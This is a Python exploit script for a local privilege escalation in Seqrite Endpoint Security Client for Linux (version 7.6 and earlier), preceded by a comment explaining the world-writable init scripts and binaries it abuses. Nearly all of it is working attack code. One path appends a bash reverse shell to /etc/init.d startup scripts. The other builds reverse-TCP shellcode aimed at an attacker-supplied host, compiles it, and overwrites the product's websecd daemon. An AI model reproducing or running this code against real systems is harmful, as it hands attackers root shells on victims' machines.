#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: Seqrite Endpoint Security Client (<=7.6) - Local Privilege Escalation
# Date: 2023-04-08
# Exploit Author: Pinaki Mondal (@0xInfection)
# Vendor Homepage: https://www.quickheal.com
# Software Link: https://www.seqrite.com/endpoint-security/seqrite-endpoint-security
# Version: <= 7.6
# Tested on: Debian, Ubuntu

# Seqrite endpoint security with its default installation installs to
# /usr/lib/Seqrite/ with very weak directory and file permissions granting any
# arbitrary user full write permission to the contents of the directory and its
# contents. In addition, the installation procedure installs its startup scripts
# to /etc/init.d/ which are world writable. This enables any low-privilege user on
# the system to escalate privileges to root.
#
# The exploit makes use of 2 different vulnerabilities to elevate privileges on the
# system. Firstly, the fact that the application uses scripts in /etc/init.d/ to start
# its scan processes which can be written to by any user. Secondly, the application
# makes use shared objects to dynamically load position-independent code during runtime.
# As a matter of fact, all of the executable shared object files are world writable.
# Lastly, the application binaries used for the daemon process are world writable
# which basically means any non-privileged user could overwrite the scan binaries
# with their own malicious executable to get code executed in root content.

import os
import struct
import socket
import binascii
import argparse
import shutil
import subprocess

BASE_INSTALL_PATH = '/usr/lib/Seqrite/Seqrite/'

def check_installation() -> bool:
    '''
    Checks if the product is installed on the target machine
    '''
    print('[*] Trying to determine if Seqrite is installed on the system...')
    if os.path.exists(BASE_INSTALL_PATH):
        print('[+] Found Seqrite installation at:', BASE_INSTALL_PATH)
        return True
    return False

def poison_initd_scripts(host: str, port: int) -> bool:
    '''
    Posions /etc/init.d/ scripts installed by the installer
    that the software uses for its startup daemon.
    '''
    startup_scripts = [
        "qhclagnt",
        "quickupdate",
        "qhscndmn"
    ]
    etc_initd_path = '/etc/init.d/'
    bash_reverse_shell = '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(
        ip=host,
        port=port
    )
    success_flag = False

    for script_path in startup_scripts:
        try:
            abs_path = os.path.join(etc_initd_path, script_path)
            print('[+] Confirming installation setup of file:', abs_path)
            if os.path.exists(abs_path):
                print('[+] Confirmed existence of file:', abs_path)
            else:
                print('[-] File "%s" not found. Moving on...' % abs_path)
                continue

            with open(abs_path, 'r') as rd_fd:
                content = rd_fd.read()

            print('[+] Trying to poison the startup file:', abs_path)
            with open(abs_path, 'w+') as wr_fd:
                wr_fd.write(content + '\n\n' + bash_reverse_shell)
                success_flag = True

        except Exception as err:
            print('[-] Exception when injecting into {fname}: {error}'.format(
                fname=abs_path,
                error=err.__str__()
            ))
    print('[+] Exploit completed.')
    return success_flag

def find_xor_byte(host: bytes) -> int:
    '''
    Finds XOR bytes
    '''
    xor_byte = 0
    for i in range(1, 256):
        matched_a_byte = False
        for octet in host:
            if i == int(hex(octet), 16):
                matched_a_byte = True
                break

        if not matched_a_byte:
            xor_byte = i
            break

    if xor_byte == 0:
        print('Fatal: Could not find a XOR byte!')

    return xor_byte

def compile_exploit(exp: str, shellcode: str) -> tuple:
    '''
    Compiles an exploit to its C base
    '''
    compiled_file = "reverse_tcp_shell.bin"
    gcc_bin = shutil.which('gcc')
    if not gcc_bin:
        print('[-] Fatal: GCC does not seem to be installed on the device. Outputting shellcode...')
        return False, ''

    print('[+] Shellcode generated:', shellcode)
    try:
        print('[+] Trying to build exploit...')
        subprocess.run([
            'gcc',
            '-fno-stack-protector',
            '-z', 'execstack',
            exp,
            "-o", compiled_file
        ])
    except Exception as err:
        print('[-] Fatal: Incurred error:', err.__str__())
        return False, ''

    print('[+] Exploit completed.')
    return True, compiled_file

def poison_daemon_binaries(host: str, port: str):
    '''
    Posions the software's main daemon binaries used for scanning files,
    web filtering, etc.
    '''
    reverse_tcp_shellcode = "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2" + \
        "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb" + \
        "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66" + \
        "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0" + \
        "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02" + \
        "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8" + \
        "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2" + \
        "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0" + \
        "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6" + \
        "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f" + \
        "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89" + \
        "\\xe3\\xb0\\x0b\\xcd\\x80"

    ip = socket.inet_aton(host)
    print(ip.__repr__())
    bytex = find_xor_byte(ip)
    shellc = reverse_tcp_shellcode.replace(
        "\\xb8\\xff\\xff\\xff\\xff",
        "\\xb8\\x{z}\\x{z}\\x{z}\\x{z}".format(
            z=binascii.hexlify(struct.pack('B', bytex)).decode()
        )
    )
    newip = [
        binascii.hexlify(struct.pack(
            'B',
            int(hex(ip[i]), 16) ^ bytex
        ))
        for i in range(0, 4)
    ]
    shellc = shellc.replace(
        "\\xbb\\x80\\xff\\xff\\xfe",
        "\\xbb\\x{shiftx1}\\x{shiftx2}\\x{shiftx3}\\x{shiftx4}".format(
            shiftx1=newip[0].decode(),
            shiftx2=newip[1].decode(),
            shiftx3=newip[2].decode(),
            shiftx4=newip[3].decode()
        )
    )

    portc = hex(socket.htons(int(port)))
    shellc = shellc.replace(
        "\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{shiftx1}\\x{shiftx2}".format(
            shiftx1=portc[4:6],
            shiftx2=portc[2:4]
        )
    )

    shellcode_exec = ''
    shellcode_outfile = 'shellcode_exec.c'
    with open('shellcode.c', 'r') as rf:
        shellcode_exec = rf.read() % shellc

    with open(shellcode_outfile, 'w+') as wf:
        wf.write(shellcode_exec)

    success, filex = compile_exploit(
        exp=shellcode_outfile,
        shellcode=shellc
    )
    if success:
        print('[+] Exploit compiled.')
    else:
        print("[-] Exploit compilation failed. Aborting...")
        quit()

    print('[+] Overwriting /usr/lib/Seqrite/Seqrite/websecd binary...')
    shutil.copyfile(filex, os.path.join(BASE_INSTALL_PATH, 'websecd'))
    print('[+] Exploit completed.')

def print_choice() -> str:
    '''
    Choices for the exploit path
    '''
    return input('''
Select privesc technique:
  1. Daemon controller /etc/init.d/ scripts posioning
  2. Overwriting daemon binaries (requires GCC installed)
Enter choice #> ''')

def main():
    '''
    Wraps up the exploit strategy
    '''
    parser = argparse.ArgumentParser(
        prog=os.path.basename(__file__),
        usage='%s <texhnique>' % os.path.basename(__file__),
    )
    parser.add_argument(
        '-H',
        '--hostport',
        dest='hostport',
        help='The IP and port of the listening attacker machine in format of <ip>:<port>'
    )
    parser.add_argument(
        '-B',
        '--daemon-binaries',
        dest='ob',
        action='store_true',
        help='Overwrite the main daemon binaries to escalate privileges.'
    )
    parser.add_argument(
        '-I',
        '--initd-scripts',
        dest='init',
        action='store_true',
        help='Posion /etc/init.d/ bash startup scripts with a reverse shell to escalate privileges.'
    )
    args = parser.parse_args()

    if not args.hostport:
        print('[-] No host:port supplied. Please specify one.')
        parser.print_help()
        quit()
    elif ':' not in args.hostport:
        print('[-] Fatal: No host and port combination supplied. Please check input.')
        parser.print_help()
        quit()

    if not args.init and not args.ob:
        print('[-] No technique flag used, switching to interactive.')
        inputx = print_choice()

    if not check_installation():
        print('[-] Failed to find Seqrite installation directory. Aborting...')
        quit()

    if inputx == '1' or args.init:
        poison_initd_scripts(
            host=args.hostport.split(':')[0],
            port=args.hostport.split(':')[1]
        )
    elif inputx == '2' or args.ob:
        poison_daemon_binaries(
            host=args.hostport.split(':')[0],
            port=args.hostport.split(':')[1]
        )
    else:
        print('[-] Unimplemented option:', inputx)

    print('[#] You can wait for the reverse shell to trigger when the AV reloads/the machine reboots.')
    print('[#] Make sure to initate a listener on the attacker machine at the specified host:port!')

if __name__ == '__main__':
    main()
